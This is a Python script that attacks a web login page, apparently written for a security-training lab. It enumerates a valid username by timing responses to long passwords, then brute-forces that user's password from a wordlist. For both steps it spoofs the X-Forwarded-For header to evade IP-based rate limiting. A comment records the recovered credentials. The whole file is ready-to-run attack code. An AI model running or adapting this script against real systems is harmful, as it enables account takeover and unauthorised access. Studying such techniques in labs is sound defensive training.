import requests
import sys
import urllib3
import pprint # to print dict nicely.

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http":"https://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

def getpassword(url,user):
    '''
    send request with identified username, and brute-force all
    passwords in password list file
    '''
    path = "login"
    with open('auth-passwords','r') as fpasswords:
        passwords = fpasswords.readlines()
        i = 1
        found = "NOT FOUND"
        for p in passwords:
            p = p.strip('\n')
            xforward = {'X-Forwarded-For': str(i)}
            params = {'username':user,'password':p}
            r = requests.post(url + path, data = params, headers=xforward, verify=False, proxies=proxies, timeout=30)
            if "Invalid username or password" not in r.text:
                found = p
            else:
                i += 1
    return found

def getuser(url):
    '''
    send request with variable username, long password ~100 chars.
    save username,response_time in user_dict dictionary and return
    username with maximum response time
    '''
    path = "login"
    with open('auth-usernames','r') as fusernames:
        usernames = fusernames.readlines()
        i = 1
        user_dict = {}
        for u in usernames:
            u = u.strip('\n')
            xforward = {'X-Forwarded-For': str(i)}
            params = {'username':u,'password':'peteraaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'}
            r = requests.post(url + path, data = params, headers=xforward, verify=False, proxies=proxies, timeout=30)
            user_dict.update({u : r.elapsed.total_seconds()})
            i += 1
        #pprint.pprint(user_dict)
        return (str(max(user_dict, key=user_dict.get)))

def main():
    if len(sys.argv) != 2:
        print ("(+) Usage: %s <url> " % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print ("[+] Brute-Forcing login page - by response time")
    
    #username = "announce"
    sys.stdout.write ("\r\t [1] Get user with longest response time: ")
    sys.stdout.flush()
    username = getuser(url)
    sys.stdout.write(username)
    sys.stdout.flush()
    print()
    sys.stdout.write("\r\t [2] Get password for "+username+": ")
    sys.stdout.flush()
    password = getpassword(url,username)
    sys.stdout.write(password)
    sys.stdout.flush()

    #announce:chelsea

if __name__ == "__main__":
    main()